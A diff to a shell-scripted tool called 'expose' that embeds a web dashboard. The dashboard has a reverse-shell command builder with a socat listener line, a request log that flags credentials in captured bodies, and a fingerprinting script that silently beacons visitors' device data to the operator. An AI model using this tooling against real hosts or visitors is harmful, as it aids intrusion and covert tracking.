+    ['socat · tty',`socat file:/dev/tty,raw,echo=0 tcp-listen:{P}`,'best'],
+  ];
+  let os='linux';
+  const cur=()=>({h:(hostIn.value||'CHANGE_ME').trim()||'CHANGE_ME',
+                  p:(portIn.value||'4444').trim()||'4444'});
+  const sub=s=>{const{h,p}=cur();return s.replaceAll('{H}',h).replaceAll('{P}',p)};
+
+  function group(title,hint,rows){
+    let h='<div class="cmd-g"><h4>'+title+' &middot; '+hint+'</h4>';
+    rows.forEach(([tool,cmd,best])=>{
+      h+='<div class="cmd"><span class="cmd-t">'+esc(tool)+
+         (best?'<span class="cmd-best">'+esc(best)+'</span>':'')+'</span>'+
+         '<code class="cmd-c">'+esc(sub(cmd))+'</code>'+
+         '<button class="iconbtn cmd-copy" data-c="'+ea(sub(cmd))+'" title="Copy command" aria-label="Copy command">'+I.copy+'</button></div>';
+    });
+    return h+'</div>';
+  }
+  function render(){
+    box.innerHTML=group('Start a listener','run on your machine first',LISTENER)+
+                  group('Run on the target','connects back to you',RS[os]);
+  }
+  box.addEventListener('click',e=>{
+    const b=e.target.closest('.cmd-copy');if(!b)return;
+    copyText(b.dataset.c,'Command copied')});
+  q('rs-pills').addEventListener('click',e=>{
+    const p=e.target.closest('.os-pill');if(!p)return;
+    os=p.dataset.os;
+    q('rs-pills').querySelectorAll('.os-pill').forEach(x=>x.classList.toggle('active',x===p));
+    render()});
+  hostIn.addEventListener('input',render);
+  portIn.addEventListener('input',render);
+  q('rs-h').addEventListener('click',e=>{
+    if(e.target.closest('.os-pill')||e.target.closest('.rs-in'))return;
+    q('rs-card').classList.toggle('collapsed')});
+  render();
+})();
+
+// ── request log drawer ────────────────────────────────────
+(function(){
+  const lp=q('log'),lpBar=q('log-bar'),lpBody=q('log-body'),lpBadge=q('log-badge'),
+        lpSearch=q('log-search'),lpEmpty=q('log-empty'),live=q('live'),
+        btnPause=q('log-pause'),btnExport=q('log-export'),btnClear=q('log-clear');
+  let entries=[],lastN=0,paused=false,autoScroll=true,filter='';
+  const openRows=new Set();   // n of expanded entries — survives re-renders
+
+  function toggleLog(force){
+    const willCollapse=force!=null?force:lp.classList.contains('collapsed')?false:true;
+    lp.classList.toggle('collapsed',willCollapse);
+    document.body.classList.toggle('log-open',!willCollapse);
+  }
   lpBar.addEventListener('click',e=>{
-    if(e.target.closest('.lp-search')||e.target.closest('.lp-btn'))return;
-    lp.classList.toggle('collapsed')});
-  // keyboard shortcut: L to toggle
+    if(e.target.closest('.log-search')||e.target.closest('.btn')||e.target.closest('input'))return;
+    toggleLog()});
+  lpBar.addEventListener('keydown',e=>{if(e.key==='Enter'&&e.target===lpBar)toggleLog()});
   document.addEventListener('keydown',e=>{
     if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA')return;
-    if(e.key==='l'||e.key==='L'){e.preventDefault();lp.classList.toggle('collapsed')}});
+    if(e.key==='l'||e.key==='L'){e.preventDefault();toggleLog()}});
 
-  // search filter
-  lpSearch.addEventListener('input',()=>{filter=lpSearch.value.toLowerCase();renderEntries()});
+  lpSearch.addEventListener('input',()=>{filter=lpSearch.value.toLowerCase();renderAll()});
   lpSearch.addEventListener('click',e=>e.stopPropagation());
 
-  // pause
   btnPause.addEventListener('click',e=>{e.stopPropagation();paused=!paused;
     btnPause.textContent=paused?'resume':'pause';
-    btnPause.classList.toggle('active',paused)});
+    btnPause.classList.toggle('active',paused);
+    live.classList.toggle('paused',paused)});
 
-  // export
   btnExport.addEventListener('click',e=>{e.stopPropagation();
     const json=JSON.stringify(entries,null,2);
     if(navigator.clipboard&&navigator.clipboard.writeText){
-      navigator.clipboard.writeText(json).then(()=>{btnExport.textContent='copied';
-        setTimeout(()=>{btnExport.textContent='export'},1200)}).catch(()=>dlJson(json));
-    }else{dlJson(json)}});
+      navigator.clipboard.writeText(json).then(()=>toast('Log copied as JSON')).catch(()=>dlJson(json));
+    }else dlJson(json)});
   function dlJson(txt){const b=new Blob([txt],{type:'application/json'});
     const a=document.createElement('a');a.href=URL.createObjectURL(b);
     a.download='expose-log.json';a.click();URL.revokeObjectURL(a.href)}
 
-  // clear
   btnClear.addEventListener('click',e=>{e.stopPropagation();
-    fetch('/log/clear',{method:'POST'}).then(()=>{entries=[];lastN=0;renderEntries()}).catch(()=>{})});
+    fetch('/log/clear',{method:'POST'}).then(()=>{
+      entries=[];lastN=0;openRows.clear();renderAll();toast('Log cleared')}).catch(()=>{})});
 
-  // detect scroll position to auto-scroll
   lpBody.addEventListener('scroll',()=>{
     autoScroll=lpBody.scrollHeight-lpBody.scrollTop-lpBody.clientHeight<30});
+
+  // ── new-request sound ──
+  const btnSound=q('log-sound');
+  let soundOn=false,painted=false,audioCtx=null;
+  try{soundOn=localStorage.getItem('expose-sound')==='1'}catch(e){}
+  btnSound.classList.toggle('active',soundOn);
+  btnSound.addEventListener('click',e=>{e.stopPropagation();
+    soundOn=!soundOn;
+    try{localStorage.setItem('expose-sound',soundOn?'1':'0')}catch(e2){}
+    btnSound.classList.toggle('active',soundOn);
+    if(soundOn)blip()});
+  function blip(){
+    if(!soundOn)return;
+    try{
+      audioCtx=audioCtx||new(window.AudioContext||window.webkitAudioContext)();
+      if(audioCtx.state==='suspended')audioCtx.resume();
+      const t=audioCtx.currentTime;
+      [880,660].forEach((f,i)=>{
+        const o=audioCtx.createOscillator(),g=audioCtx.createGain();
+        o.type='sine';o.frequency.value=f;
+        o.connect(g);g.connect(audioCtx.destination);
+        g.gain.setValueAtTime(0.0001,t+i*0.09);
+        g.gain.exponentialRampToValueAtTime(0.1,t+i*0.09+0.02);
+        g.gain.exponentialRampToValueAtTime(0.0001,t+i*0.09+0.14);
+        o.start(t+i*0.09);o.stop(t+i*0.09+0.15)});
+    }catch(e){}}
+
+  // ── stats popover (click the count badge) ──
+  const statsEl=q('stats');
+  lpBadge.addEventListener('click',e=>{
+    e.stopPropagation();
+    if(statsEl.hidden){renderStats();statsEl.hidden=false}else statsEl.hidden=true});
+  document.addEventListener('click',e=>{
+    if(!statsEl.hidden&&!e.target.closest('#stats')&&!e.target.closest('#log-badge'))
+      statsEl.hidden=true});
+  function renderStats(){
+    const ips={},mth={},paths={};
+    entries.forEach(en=>{
+      ips[en.ip]=(ips[en.ip]||0)+1;
+      mth[en.method]=(mth[en.method]||0)+1;
+      paths[en.path]=(paths[en.path]||0)+1});
+    const top=(o,n)=>Object.entries(o).sort((a,b)=>b[1]-a[1]).slice(0,n);
+    let h='<h4>Overview &middot; '+entries.length+' requests &middot; '+
+          Object.keys(ips).length+' clients</h4><div class="st-chips">';
+    for(const[m,c]of top(mth,8))h+='<span class="st-chip">'+esc(m)+' '+c+'</span>';
+    h+='</div><h4>Top clients</h4>';
+    for(const[ip,c]of top(ips,5))h+='<div class="st-row"><span class="st-k">'+esc(ip)+'</span><b>'+c+'</b></div>';
+    h+='<h4>Top paths</h4>';
+    for(const[p,c]of top(paths,5))h+='<div class="st-row"><span class="st-k" title="'+ea(p)+'">'+esc(p)+'</span><b>'+c+'</b></div>';
+    statsEl.innerHTML=h}
 
   function matchesFilter(e){
     if(!filter)return true;
     const hay=[e.method,e.path,e.code,e.ip,e.ua,e.host||'',e.referer||'',
-               e.cookie||'',e.origin||'',e.xff||'',e.content_type||'',e.authorization||''].join(' ').toLowerCase();
+               e.cookie||'',e.origin||'',e.xff||e.x_forwarded_for||'',e.content_type||'',
+               e.auth||e.authorization||'',e.body||''].join(' ').toLowerCase();
     return hay.includes(filter)}
 
   function hl(text){
@@ -819,92 +1666,173 @@ function _loadDir(path){
     return s.replace(new RegExp('('+fl+')','gi'),'<span class="le-hl">$1</span>')}
 
   function methodClass(m){return(m||'').toLowerCase().replace(/[^a-z]/g,'')}
-  function codeClass(c){const s=String(c)[0];return s>='2'&&s<='5'?'c'+s:''}
+  function codeClass(c){const s=String(c||'')[0];return s>='2'&&s<='5'?'c'+s:''}
+
+  // credential / secret spotter (bodies only)
+  const SECRET_RE=/(passw(or)?d|pwd|secret|token|api[-_]?key|apikey|authorization|credential|session[-_]?id|private[-_]?key)/i;
+
+  // decode request bodies: JSON pretty-print, JWT decode, form-urlencoded
+  function b64d(s){s=s.replace(/-/g,'+').replace(/_/g,'/');while(s.length%4)s+='=';
+    try{return decodeURIComponent(escape(atob(s)))}catch(e){try{return atob(s)}catch(e2){return''}}}
+  function smartBody(raw){
+    const t=String(raw).trim();
+    if(!t)return{kind:'raw',text:raw};
+    try{return{kind:'json',text:JSON.stringify(JSON.parse(t),null,2)}}catch(_){}
+    if(/^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test(t)){
+      try{
+        const parts=t.split('.');
+        const dec=s=>JSON.stringify(JSON.parse(b64d(s)),null,2);
+        let out='// header\n'+dec(parts[0])+'\n// payload\n'+dec(parts[1]);
+        return{kind:'jwt',text:out};
+      }catch(_){}
+    }
+    if(/^[^=&\s]+=[^&]*(&[^=&\s]+=[^&]*)*$/.test(t)){
+      try{
+        return{kind:'form',text:t.split('&').map(p=>{
+          const i=p.indexOf('=');
+          return decodeURIComponent(p.slice(0,i))+' = '+decodeURIComponent(p.slice(i+1));
+        }).join('\n')};
+      }catch(_){}
+    }
+    return{kind:'raw',text:raw};
+  }
 
   function buildCurl(e){
     let c='curl';
     if(e.method!=='GET')c+=' -X '+e.method;
     c+=" '"+location.origin+e.path+"'";
-    const skip=new Set(['method','path','code','n','ts','time','httpver','ip','port','ua']);
-    if(e.ua&&e.ua!=='-')c+="\n  -H 'User-Agent: "+e.ua+"'";
-    for(const[k,v] of Object.entries(e)){
+    const skip=new Set(['method','path','code','n','ts','time','httpver','ip','port','ua','body']);
+    if(e.ua&&e.ua!=='-')c+=" \\\n  -H 'User-Agent: "+e.ua+"'";
+    for(const[k,v]of Object.entries(e)){
       if(skip.has(k)||!v||v==='-')continue;
       const hdr=k.replace(/_/g,'-').replace(/\b\w/g,l=>l.toUpperCase());
-      c+="\n  -H '"+hdr+": "+v+"'"}
+      c+=" \\\n  -H '"+hdr+": "+v+"'"}
+    if(e.body)c+=" \\\n  -d '"+String(e.body).replace(/'/g,"'\\''")+"'";
     return c}
 
-  function renderEntries(){
+  function makeNodes(e){
+    const row=document.createElement('div');row.className='le';row.dataset.n=e.n;
+    const flag=e.body&&SECRET_RE.test(e.body)?'<span class="le-flag">creds</span>':'';
+    row.innerHTML='<span class="le-n">'+e.n+'</span>'+
+      '<span class="le-time">'+hl(e.time)+'</span>'+
+      '<span class="le-m '+methodClass(e.method)+'">'+hl(e.method)+'</span>'+
+      '<span class="le-path" title="'+ea(e.path)+'"><span class="le-p">'+hl(e.path)+'</span>'+flag+'</span>'+
+      '<span class="le-code '+codeClass(e.code)+'">'+hl(e.code||'')+'</span>'+
+      '<span class="le-ip">'+hl(e.ip)+'</span>'+
+      '<span class="le-ua" title="'+ea(e.ua)+'">'+hl(e.ua)+'</span>';
+    const det=document.createElement('div');det.className='le-detail';
+    const pairs=[['HTTP',e.httpver],['Client',e.ip+':'+e.port],
+      ['Host',e.host],['User-Agent',e.ua],['Accept',e.accept],
+      ['Accept-Language',e.accept_lang||e.accept_language],
+      ['Accept-Encoding',e.accept_enc||e.accept_encoding],
+      ['Referer',e.referer],['Origin',e.origin],['Cookie',e.cookie],
+      ['Connection',e.connection],['Content-Type',e.content_type],
+      ['Content-Length',e.content_len||e.content_length],
+      ['X-Forwarded-For',e.xff||e.x_forwarded_for],['Authorization',e.auth||e.authorization],
+      ['DNT',e.dnt]];
+    let dh='<div class="ld-grid">';
+    pairs.forEach(([k,v])=>{if(v&&v!=='-')dh+='<span class="dk">'+k+'</span><span class="dv">'+hl(v)+'</span>'});
+    dh+='</div>';
+    if(e.body){const sb=smartBody(e.body);
+      dh+='<div class="dk">Body'+(sb.kind!=='raw'?' &middot; '+sb.kind:'')+'</div>'+
+          '<pre class="dbody-pre">'+hl(sb.text)+'</pre>'}
+    const curl=buildCurl(e);
+    dh+='<div class="dcurl"><code>'+esc(curl)+'</code>'+
+        '<button class="iconbtn dc-copy" title="Copy as curl">'+I.copy+'</button></div>';
+    det.innerHTML=dh;
+    det.querySelector('.dc-copy').addEventListener('click',ev=>{
+      ev.stopPropagation();copyText(curl,'curl command copied')});
+    if(openRows.has(e.n)){row.classList.add('expanded');det.classList.add('open')}
+    return[row,det]}
+
+  // full rebuild — only on filter change / clear / first paint
+  function renderAll(){
     const vis=entries.filter(matchesFilter);
     lpBadge.textContent=entries.length||'';
-    if(!vis.length){lpBody.innerHTML='';lpBody.appendChild(lpEmpty);lpEmpty.style.display='';return}
+    lpBody.innerHTML='';
+    if(!vis.length){lpBody.appendChild(lpEmpty);lpEmpty.style.display='';return}
     lpEmpty.style.display='none';
-    // rebuild
     const frag=document.createDocumentFragment();
-    vis.forEach(e=>{
-      const row=document.createElement('div');row.className='le';row.dataset.n=e.n;
-      row.innerHTML='<span class="le-n">'+e.n+'</span>'+
-        '<span class="le-time">'+hl(e.time)+'</span>'+
-        '<span class="le-m '+methodClass(e.method)+'">'+hl(e.method)+'</span>'+
-        '<span class="le-path" title="'+esc(e.path)+'">'+hl(e.path)+'</span>'+
-        '<span class="le-code '+codeClass(e.code||'')+'">'+hl(e.code||'')+'</span>'+
-        '<span class="le-ip">'+hl(e.ip)+'</span>'+
-        '<span class="le-ua" title="'+esc(e.ua)+'">'+hl(e.ua)+'</span>';
-      frag.appendChild(row);
-      // detail row (hidden until expanded)
-      const det=document.createElement('div');det.className='le-detail';
-      const pairs=[['HTTP',e.httpver],['Client',e.ip+':'+e.port],
-        ['Host',e.host],['User-Agent',e.ua],['Accept',e.accept],
-        ['Accept-Language',e.accept_lang||e.accept_language],
-        ['Accept-Encoding',e.accept_enc||e.accept_encoding],
-        ['Referer',e.referer],['Origin',e.origin],['Cookie',e.cookie],
-        ['Connection',e.connection],['Content-Type',e.content_type],
-        ['Content-Length',e.content_len||e.content_length],
-        ['X-Forwarded-For',e.xff||e.x_forwarded_for],['Authorization',e.auth||e.authorization],
-        ['DNT',e.dnt]];
-      let dhtml='';
-      pairs.forEach(([k,v])=>{if(v&&v!=='-')dhtml+='<div><span class="dk">'+k+'</span> <span class="dv">'+hl(v)+'</span></div>'});
-      if(e.body){dhtml+='<div class="dbody"><span class="dk">Body</span><pre class="dbody-pre">'+hl(e.body)+'</pre></div>'}
-      dhtml+='<div class="dcurl">'+esc(buildCurl(e))+'</div>';
-      det.innerHTML=dhtml;frag.appendChild(det);
-    });
-    lpBody.innerHTML='';lpBody.appendChild(frag);
+    vis.forEach(e=>{const[r,d]=makeNodes(e);frag.appendChild(r);frag.appendChild(d)});
+    lpBody.appendChild(frag);
+    if(autoScroll)lpBody.scrollTop=lpBody.scrollHeight}
+
+  // incremental — append only the new entries; existing rows stay untouched
+  function appendNew(fresh){
+    if(lpEmpty.parentNode===lpBody)lpEmpty.remove();
+    fresh.forEach(e=>{
+      if(!matchesFilter(e))return;
+      const[r,d]=makeNodes(e);
+      lpBody.appendChild(r);lpBody.appendChild(d)});
+    // keep DOM in sync with the 500-entry cap (row + detail pairs)
+    while(lpBody.childElementCount>1000){
+      lpBody.removeChild(lpBody.firstChild);
+      if(lpBody.firstChild)lpBody.removeChild(lpBody.firstChild)}
     if(autoScroll)lpBody.scrollTop=lpBody.scrollHeight}
 
   lpBody.addEventListener('click',e=>{
     const row=e.target.closest('.le');if(!row)return;
-    row.classList.toggle('expanded')});
+    const n=+row.dataset.n;
+    const expanding=!row.classList.contains('expanded');
+    row.classList.toggle('expanded',expanding);
+    const det=row.nextElementSibling;
+    if(det&&det.classList.contains('le-detail'))det.classList.toggle('open',expanding);
+    if(expanding)openRows.add(n);else openRows.delete(n)});
 
   function poll(){
     if(paused)return;
     fetch('/log?since='+lastN).then(r=>r.json()).then(data=>{
       if(!data.length)return;
-      data.forEach(e=>{if(e.n>lastN){entries.push(e);lastN=e.n}});
+      const fresh=[];
+      data.forEach(e=>{if(e.n>lastN){entries.push(e);fresh.push(e);lastN=e.n}});
       if(entries.length>500)entries=entries.slice(-500);
-      renderEntries();
+      lpBadge.textContent=entries.length||'';
+      if(!statsEl.hidden)renderStats();
+      if(!fresh.length)return;
+      if(entries.length===fresh.length){renderAll();painted=true;return}   // first paint
+      appendNew(fresh);
+      if(painted)blip();
     }).catch(()=>{});
   }
   setInterval(poll,2000);
   poll();
 })();
 
-// ── Shared clipboard (chat) ──
+// ── chat ──────────────────────────────────────────────────
 (function(){
-  const cp=q('chat-panel');
-  if(!cp)return;
-  const cbody=q('chat-body'), cin=q('chat-input'), csend=q('chat-send');
-  let lastN=0;
+  const panel=q('chat'),cbody=q('chat-body'),cin=q('chat-input'),csend=q('chat-send'),
+        toggle=q('chat-toggle'),dot=q('chat-dot');
+  let lastN=0,seen=false;
+
+  // open by default, but remember if the user closed it
+  function openChat(focus){panel.hidden=false;dot.hidden=true;toggle.classList.add('active');
+    if(focus!==false)cin.focus();
+    try{localStorage.setItem('expose-chat','open')}catch(e){}}
+  function closeChat(){panel.hidden=true;toggle.classList.remove('active');
+    try{localStorage.setItem('expose-chat','closed')}catch(e){}}
+  try{if(localStorage.getItem('expose-chat')==='closed'){closeChat()}else{openChat(false)}}catch(e){openChat(false)}
+  toggle.addEventListener('click',()=>{panel.hidden?openChat():closeChat()});
+  q('chat-close').addEventListener('click',closeChat);
+
+  // one-click copy of any message
+  cbody.addEventListener('click',e=>{
+    const m=e.target.closest('.cm');if(!m)return;
+    copyText(m.querySelector('.cx').textContent,'Message copied')});
 
   function refresh(){
     fetch('/chat').then(r=>r.json()).then(msgs=>{
       if(!msgs.length)return;
       const added=msgs.filter(m=>m.n>lastN);
       if(!added.length)return;
+      const had=lastN>0;
       lastN=msgs[msgs.length-1].n;
       added.forEach(m=>{
-        const d=document.createElement('div');d.className='cm';
-        d.innerHTML='<span class="ct">'+esc(m.time)+'</span><span class="cn">#'+m.n+'</span><span class="cx">'+esc(m.msg)+'</span>';
+        const d=document.createElement('div');d.className='cm';d.title='Click to copy';
+        d.innerHTML='<span class="ct">'+esc(m.time)+'</span><span class="cx">'+esc(m.msg)+'</span>';
         cbody.appendChild(d)});
-      cbody.scrollTop=cbody.scrollHeight})}
+      cbody.scrollTop=cbody.scrollHeight;
+      if(panel.hidden&&had)dot.hidden=false;   // unread indicator (skip initial backlog)
+    }).catch(()=>{})}
 
   function send(){
     const v=cin.value.trim();
@@ -913,517 +1841,409 @@ function _loadDir(path){
 
   csend.addEventListener('click',send);
   cin.addEventListener('keydown',e=>{if(e.key==='Enter'){e.preventDefault();send()}});
-  setInterval(refresh,2000);refresh()
+  setInterval(refresh,2000);refresh();
+})();
+</script>
+<script>/* expose — client-side device fingerprint
+   Collects browser/device signals on every page, renders the panel on /me
+   (into <div id="fp">), and reports everything to POST /fp where it is
+   logged to the operator's SQLite database. */
+(function(){
+  var mount=document.getElementById('fp');
+
+  var d={};
+
+  // ── basics ──
+  d.user_agent=navigator.userAgent;
+  d.platform=navigator.platform||'?';
+  d.languages=(navigator.languages||[navigator.language]).join(', ');
+  d.timezone=(function(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){return'?'}})()+
+    ' (UTC'+(function(){var o=-new Date().getTimezoneOffset()/60;return(o>=0?'+':'')+o})()+')';
+  d.screen=screen.width+'×'+screen.height+' @'+(window.devicePixelRatio||1)+'x, '+screen.colorDepth+'bit';
+  d.viewport=window.innerWidth+'×'+window.innerHeight;
+  d.cpu_cores=navigator.hardwareConcurrency||'?';
+  d.device_memory=navigator.deviceMemory?navigator.deviceMemory+' GB (approx)':'?';
+  d.touch_points=navigator.maxTouchPoints||0;
+  d.cookies_enabled=navigator.cookieEnabled;
+  d.do_not_track=navigator.doNotTrack==='1'?'yes':(navigator.doNotTrack||'unset');
+  d.online=navigator.onLine;
+  d.pdf_viewer=navigator.pdfViewerEnabled===true;
+  try{d.connection=(navigator.connection&&navigator.connection.effectiveType)||'?'}catch(e){d.connection='?'}
+  d.storage=(function(){
+    var r=[];
+    try{localStorage.setItem('__t','1');localStorage.removeItem('__t');r.push('localStorage')}catch(e){}
+    try{sessionStorage.setItem('__t','1');sessionStorage.removeItem('__t');r.push('sessionStorage')}catch(e){}
+    if(window.indexedDB)r.push('indexedDB');
+    return r.join(', ')||'none'})();
+
+  // ── WebGL GPU ──
+  try{
+    var c=document.createElement('canvas');
+    var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(gl){
+      var ext=gl.getExtension('WEBGL_debug_renderer_info');
+      d.gpu=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);
+    }else d.gpu='unavailable';
+  }catch(e){d.gpu='unavailable'}
+
+  // ── canvas fingerprint ──
+  d.canvas=(function(){
+    try{
+      var cv=document.createElement('canvas');cv.width=240;cv.height=40;
+      var x=cv.getContext('2d');
+      x.textBaseline='top';x.font='14px Arial';
+      x.fillStyle='#f60';x.fillRect(10,10,100,20);
+      x.fillStyle='#069';x.fillText('expose·fp·👁',14,14);
+      x.strokeStyle='rgba(0,128,255,.5)';x.arc(60,20,12,0,Math.PI*1.7);x.stroke();
+      var url=cv.toDataURL(),h=0x811c9dc5;
+      for(var i=0;i<url.length;i++){h^=url.charCodeAt(i);h=(h*0x01000193)>>>0}
+      return h.toString(16);
+    }catch(e){return'blocked'}
+  })();
+
+  // ── render ──
+  var labels={
+    user_agent:'User-Agent',platform:'Platform',languages:'Languages',timezone:'Timezone',
+    screen:'Screen',viewport:'Viewport',cpu_cores:'CPU cores',device_memory:'Device memory',
+    touch_points:'Touch points',cookies_enabled:'Cookies',do_not_track:'Do Not Track',
+    online:'Online',pdf_viewer:'PDF viewer',connection:'Connection',storage:'Storage APIs',
+    gpu:'GPU (WebGL)',canvas:'Canvas fingerprint'
+  };
+  var order=['user_agent','platform','languages','timezone','screen','viewport','cpu_cores',
+             'device_memory','touch_points','cookies_enabled','do_not_track','online',
+             'pdf_viewer','connection','storage','gpu','canvas'];
+
+  // ── render panel (/me only) ──
+  if(mount){
+    var h='<h2>Device fingerprint</h2><table>';
+    order.forEach(function(k){
+      if(d[k]===undefined||d[k]==='')return;
+      h+='<tr><td>'+labels[k]+'</td><td></td></tr>';
+    });
+    h+='</table><div class="fpid">visitor id: <b>computing…</b></div>'+
+       '<p class="fpnote">Collected by your browser and reported to this server — '+
+       'this is what any website can see about you.</p>'+
+       '<button class="fbtn" id="fpcopy">copy as JSON</button>';
+    mount.innerHTML=h;
+
+    var rows=mount.querySelectorAll('td:nth-child(2)');
+    var i=0;
+    order.forEach(function(k){
+      if(d[k]===undefined||d[k]==='')return;
+      rows[i++].textContent=String(d[k]);
+    });
+
+    document.getElementById('fpcopy').addEventListener('click',function(){
+      var j=JSON.stringify(d,null,2);
+      var b=this;
+      function ok(){b.textContent='copied';setTimeout(function(){b.textContent='copy as JSON'},1200)}
+      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(j).then(ok).catch(ok)}
+      else ok();
+    });
+  }
+
+  // ── stable visitor id: SHA-256 over the stable signals ──
+  var stable=['user_agent','platform','languages','timezone','screen','cpu_cores',
+              'device_memory','gpu','canvas'].map(function(k){return d[k]}).join('|');
+  function show(id){
+    if(!mount)return;
+    var el=mount.querySelector('.fpid b');
+    if(el)el.textContent=id;
+  }
+  function finish(id){
+    d.visitor_id=id;
+    show(id);
+    report();
+  }
+  // ── report to the operator (logged to sqlite via POST /fp) ──
+  function report(){
+    d.page=location.pathname;
+    var payload;
+    try{payload=JSON.stringify(d)}catch(e){return}
+    try{
+      if(navigator.sendBeacon){
+        var ok=navigator.sendBeacon('/fp',new Blob([payload],{type:'application/json'}));
+        if(ok)return;
+      }
+      fetch('/fp',{method:'POST',headers:{'Content-Type':'application/json'},body:payload,keepalive:true}).catch(function(){});
+    }catch(e){}
+  }
+  if(window.crypto&&crypto.subtle&&crypto.subtle.digest){
+    crypto.subtle.digest('SHA-256',new TextEncoder().encode(stable)).then(function(buf){
+      var hex=Array.from(new Uint8Array(buf)).map(function(b){return('0'+b.toString(16)).slice(-2)}).join('');
+      finish(hex.slice(0,16));
+    }).catch(function(){finish('unavailable')});
+  }else finish('unavailable');
 })();
 </script></body></html>
 UPLOADHTML
 
-_UPLOAD_PY=$(_mktmp /tmp/expose-upload-py.XXXXXX)
-cat > "$_UPLOAD_PY" << 'UPLOADPY'
-import sys, os, json
+_FP_JS=$(_mktmp /tmp/expose-fp-js.XXXXXX)
+cat > "$_FP_JS" << 'FPJS'
+/* expose — client-side device fingerprint
+   Collects browser/device signals on every page, renders the panel on /me
+   (into <div id="fp">), and reports everything to POST /fp where it is
+   logged to the operator's SQLite database. */
+(function(){
+  var mount=document.getElementById('fp');
 
-upload_dir = os.environ["EXPOSE_UPLOAD_DIR"]
-content_type = os.environ.get("UPLOAD_CT", "")
-content_len = int(os.environ.get("UPLOAD_CL", "0"))
+  var d={};
 
-os.makedirs(upload_dir, exist_ok=True)
+  // ── basics ──
+  d.user_agent=navigator.userAgent;
+  d.platform=navigator.platform||'?';
+  d.languages=(navigator.languages||[navigator.language]).join(', ');
+  d.timezone=(function(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone}catch(e){return'?'}})()+
+    ' (UTC'+(function(){var o=-new Date().getTimezoneOffset()/60;return(o>=0?'+':'')+o})()+')';
+  d.screen=screen.width+'×'+screen.height+' @'+(window.devicePixelRatio||1)+'x, '+screen.colorDepth+'bit';
+  d.viewport=window.innerWidth+'×'+window.innerHeight;
+  d.cpu_cores=navigator.hardwareConcurrency||'?';
+  d.device_memory=navigator.deviceMemory?navigator.deviceMemory+' GB (approx)':'?';
+  d.touch_points=navigator.maxTouchPoints||0;
+  d.cookies_enabled=navigator.cookieEnabled;
+  d.do_not_track=navigator.doNotTrack==='1'?'yes':(navigator.doNotTrack||'unset');
+  d.online=navigator.onLine;
+  d.pdf_viewer=navigator.pdfViewerEnabled===true;
+  try{d.connection=(navigator.connection&&navigator.connection.effectiveType)||'?'}catch(e){d.connection='?'}
+  d.storage=(function(){
+    var r=[];
+    try{localStorage.setItem('__t','1');localStorage.removeItem('__t');r.push('localStorage')}catch(e){}
+    try{sessionStorage.setItem('__t','1');sessionStorage.removeItem('__t');r.push('sessionStorage')}catch(e){}
+    if(window.indexedDB)r.push('indexedDB');
+    return r.join(', ')||'none'})();
 
-body = sys.stdin.buffer.read(content_len)
+  // ── WebGL GPU ──
+  try{
+    var c=document.createElement('canvas');
+    var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+    if(gl){
+      var ext=gl.getExtension('WEBGL_debug_renderer_info');
+      d.gpu=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);
+    }else d.gpu='unavailable';
+  }catch(e){d.gpu='unavailable'}
 
-boundary = None
-for p in content_type.split(";"):
-    p = p.strip()
-    if p.startswith("boundary="):
-        boundary = p[9:].strip('"')
-        break
+  // ── canvas fingerprint ──
+  d.canvas=(function(){
+    try{
+      var cv=document.createElement('canvas');cv.width=240;cv.height=40;
+      var x=cv.getContext('2d');
+      x.textBaseline='top';x.font='14px Arial';
+      x.fillStyle='#f60';x.fillRect(10,10,100,20);
+      x.fillStyle='#069';x.fillText('expose·fp·👁',14,14);
+      x.strokeStyle='rgba(0,128,255,.5)';x.arc(60,20,12,0,Math.PI*1.7);x.stroke();
+      var url=cv.toDataURL(),h=0x811c9dc5;
+      for(var i=0;i<url.length;i++){h^=url.charCodeAt(i);h=(h*0x01000193)>>>0}
+      return h.toString(16);
+    }catch(e){return'blocked'}
+  })();
 
-saved = []
-if boundary and body:
-    sep = ("--" + boundary).encode()
-    parts = body.split(sep)
-    for part in parts[1:]:
-        if part.strip() == b"--" or not part.strip():
-            continue
-        chunks = part.split(b"\r\n\r\n", 1)
-        if len(chunks) < 2:
-            continue
-        hdrs, fdata = chunks
-        if fdata.endswith(b"\r\n"):
-            fdata = fdata[:-2]
-        filename = None
-        for line in hdrs.decode("utf-8", errors="replace").split("\r\n"):
-            if "filename=" in line.lower():
-                for param in line.split(";"):
-                    param = param.strip()
-                    if param.lower().startswith("filename="):
-                        filename = param[9:].strip('"')
-                        break
-        if filename:
-            name = os.path.basename(filename).replace("..", "").lstrip(".")
-            if not name:
-                continue
-            path = os.path.join(upload_dir, name)
-            base, ext = os.path.splitext(name)
-            i = 1
-            while os.path.exists(path):
-                path = os.path.join(upload_dir, f"{base}_{i}{ext}")
-                i += 1
-            with open(path, "wb") as f:
-                f.write(fdata)
-            saved.append(os.path.basename(path))
+  // ── render ──
+  var labels={
+    user_agent:'User-Agent',platform:'Platform',languages:'Languages',timezone:'Timezone',
+    screen:'Screen',viewport:'Viewport',cpu_cores:'CPU cores',device_memory:'Device memory',
+    touch_points:'Touch points',cookies_enabled:'Cookies',do_not_track:'Do Not Track',
+    online:'Online',pdf_viewer:'PDF viewer',connection:'Connection',storage:'Storage APIs',
+    gpu:'GPU (WebGL)',canvas:'Canvas fingerprint'
+  };
+  var order=['user_agent','platform','languages','timezone','screen','viewport','cpu_cores',
+             'device_memory','touch_points','cookies_enabled','do_not_track','online',
+             'pdf_viewer','connection','storage','gpu','canvas'];
 
-result = json.dumps({"saved": saved, "count": len(saved)})
-sys.stdout.write(
-    "HTTP/1.1 200 OK\r\n"
-    "Content-Type: application/json\r\n"
-    f"Content-Length: {len(result)}\r\n"
-    "Connection: close\r\n"
-    "Server: expose\r\n"
-    "\r\n" + result
-)
-UPLOADPY
+  // ── render panel (/me only) ──
+  if(mount){
+    var h='<h2>Device fingerprint</h2><table>';
+    order.forEach(function(k){
+      if(d[k]===undefined||d[k]==='')return;
+      h+='<tr><td>'+labels[k]+'</td><td></td></tr>';
+    });
